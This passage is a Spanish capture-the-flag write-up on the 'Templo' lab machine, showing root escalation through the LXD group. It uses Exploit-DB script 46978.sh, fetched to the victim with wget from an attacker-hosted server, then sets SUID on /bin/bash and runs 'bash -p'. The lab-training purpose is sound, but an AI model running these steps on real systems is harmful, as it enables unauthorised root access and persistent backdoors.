rodgar@TheHackersLabs-Templo:~$ ls
user.txt
rodgar@TheHackersLabs-Templo:~$ cat user.txt
...
```

### Escalando Privilegios Abusando del Grupo LXD {#LXD}

Si revisamos los privilegios de nuestro usuario, no tendremos ninguno:
```bash
rodgar@TheHackersLabs-Templo:~$ sudo -l
[sudo] password for rodgar: 
Sorry, user rodgar may not run sudo on TheHackersLabs-Templo.
```

Pero, si revisamos a qué grupos pertenece nuestro usuario, veremos uno interesante:
```bash
rodgar@TheHackersLabs-Templo:~$ id
uid=1000(rodgar) gid=1000(rodgar) groups=1000(rodgar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```
Estamos en el **grupo LXD**.

Ya hemos explotado este grupo para escalar privilegios en otras máquinas de manera manual.

Puedes hacerlo siguiendo los pasos que se muestran en estos blogs:
* <a href="https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f" target="_blank">Privilege Escalation Using LXD/LXC Group Assignment To A User: A Security Misconfiguration</a>
* <a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">Lxd Privilege Escalation</a>

Esta vez, vamos a utilizar un script que nos automatiza este proceso que ya tenemos en la base de datos **Exploit-DB** de **Kali**.

Lo buscaremos con **searchsploit**:
```bash
searchsploit lxd
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                                                                                   | linux/local/46978.sh

|---|---|
Shellcodes: No Results
```

Vamos a copiarlo en nuestro directorio de trabajo:
```bash
earchsploit -m linux/local/46978.sh
  Exploit: Ubuntu 18.04 - 'lxd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46978
     Path: /usr/share/exploitdb/exploits/linux/local/46978.sh
    Codes: N/A
 Verified: False
File Type: Bourne-Again shell script, Unicode text, UTF-8 text executable
```

Analizándolo un poco, tenemos que mandar este script y una imagen de **alpine** que utilizará el script para crear la montura de la raíz de la máquina víctima.

Para la imagen, ocuparemos la que está dentro del siguiente repositorio:
* <a href="https://github.com/saghul/lxd-alpine-builder.git" target="_blank">Repositorio de saghul: lxd-alpine-builder</a>

Solo necesitas clonarlo y ya deberíamos encontrar una imagen comprimida:
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
```

Alza un servidor con **Python3** en donde tengas estos dos archivos:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Luego, descárgalos en la máquina víctima con **wget**:
```bash
rodgar@TheHackersLabs-Templo:~$ wget http://Tu_IP/46978.sh
rodgar@TheHackersLabs-Templo:~$ wget http://Tu_IP/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Y ejecuta el script, indicándole que use la imagen de **alpine**:
```bash
./46978.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------------+-----------+---------+-------------------------------+

| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE   |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+---------+-------------------------------+

| alpine | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MiB | May 30, 2025 at 12:39am (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+---------+-------------------------------+
Creating privesc
Device giveMeRoot added to privesc                  
~ # whoami
root
```
Funcionó correctamente.

Esto nos creó un contenedor llamado **privesc**, que contendrá la raíz de la máquina víctima. Lo podremos ver con el comando `lxc list`:
```bash
rodgar@TheHackersLabs-Templo:~$ lxc list
+---------+---------+---------------------+-----------------------------------------------+-----------+-----------+

|  NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+---------+---------+---------------------+-----------------------------------------------+-----------+-----------+

| privesc | RUNNING | xx.xx.xx.xx (eth0)  |  XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX (eth0)    | CONTAINER | 0         |
+---------+---------+---------------------+-----------------------------------------------+-----------+-----------+
```
Entonces, podríamos quedarnos dentro del contenedor, revisando la montura para obtener la flag y ya, pero algo que podemos hacer es, asignarle **permisos SUID** al binario `/bin/bash` (o la **Bash**), que tenemos en esta montura. Esto es para que, cuando salgamos del contenedor, podamos usar la **Bash** con privilegios de **Root**.

Sal del contenedor y revisa los permisos de la **Bash**:
```bash
/mnt/root # exit
rodgar@TheHackersLabs-Templo:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```
Bien, aún no tiene **permisos SUID**.

Entremos de nuevo al contenedor y vamos a movernos a la raíz de la montura:
```bash
rodgar@TheHackersLabs-Templo:~$ lxc exec privesc -- /bin/sh
~ # cd mnt/root/
/mnt/root #
```

Asignémosle **permisos SUID** a la **Bash**:
```bash
# Forma 1:
/mnt/root # chmod u+s bin/bash

# Forma 2:
/mnt/root # chmod 4755 bin/bash
```

Sal del contenedor y vuelve a revisar los permisos de la **Bash**:
```bash
rodgar@TheHackersLabs-Templo:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 mar 31  2024 /bin/bash
```
Ahí está, se puede ver el cambio de los permisos.

------------
**IMPORTANTE**

¿Por qué pudimos hacer esto?

Porque montamos el **root filesystem** de la máquina víctima dentro del contenedor como **volumen compartido (bind mount)**, entonces los cambios, como dar **permisos SUID** a `/bin/bash`, se reflejan en la máquina víctima.

Podemos comprobar que es una **montura compartida (bind mount)**, si se muestra con tipo **disk** al usar el comando `lxc config device show nombre_contenedor`:
```bash
rodgar@TheHackersLabs-Templo:~$ lxc config device show privesc
giveMeRoot:
  path: /mnt/root
  recursive: "true"
  source: /
  type: disk
```
Ahí está, continuemos.

------------------

Ya podremos convertirnos en **Root**, usando la **Bash** con privilegios:
```bash
rodgar@TheHackersLabs-Templo:~$ bash -p
bash-5.2# whoami
root
```

Por último, vayamos a buscar la flag del **Root**:
```bash
bash-5.2# cd /root
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
